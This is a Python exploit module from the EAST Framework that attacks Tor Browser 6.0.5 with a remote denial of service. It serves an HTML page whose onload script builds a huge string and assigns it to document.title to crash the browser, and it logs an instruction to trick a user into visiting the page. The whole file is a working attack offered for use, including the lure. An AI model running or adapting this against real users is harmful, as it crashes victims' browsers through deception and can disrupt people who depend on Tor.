#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time

sys.path.append('./core')
from Sploit import Sploit
from WebHelper import SimpleWebServer

INFO = {}
INFO['NAME'] = "efa_tor_browser_dos"
INFO['DESCRIPTION'] = "Tor Browser 6.0.5 remote Denial of Service"
INFO['VENDOR'] = ""
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['http://0day.today/exploit/27012']
INFO["CVE Name"] = ""
INFO["NOTES"] = """ Tor Browser 6.0.5 remote Denial of Service
"""
INFO['CHANGELOG'] = "15 Feb, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/Dos/'

# Must be in every module, to be set by framework
OPTIONS = {}
#OPTIONS["HOST"] = "192.168.1.207", dict(description = 'Target IP')
#OPTIONS["PORT"] = 2181, dict(description = 'Target port')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        #self.host = self.args.get('HOST', self.host)
        #self.port = int(self.args.get('PORT', self.port))
        return
    
    def run(self):
        self.args()
        
        htmlcrach = ('''<html>
<head>
<title>Tor Browser 6.0.5 Crash</title>
<script type="text/javascript">
function ex() 
{
    var buf = "";
    for (var i = 0; i <\x35\x30\x30\x30\x30; i++) 
    {
        buf += "\x41";
    }
    var buff = buf;
    for (i = 0; i <\x35\x30\x30\x30; i++) 
    {
        buff += buf;
    }
    document.title = buff;
}
</script>
</head>
<body onload="ex();"></body>
</html>''')

        server = SimpleWebServer('0.0.0.0', 8888)
        server.add_file_for_share("tor_crash.html", htmlcrach)
        server.start_serve()

        self.log('Trick user to visit http://your_ip:8888/tor_crash.html via Tor Browser 6.0.5')
        self.log('Wait 120s for remote connetion')
        time.sleep(120)
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
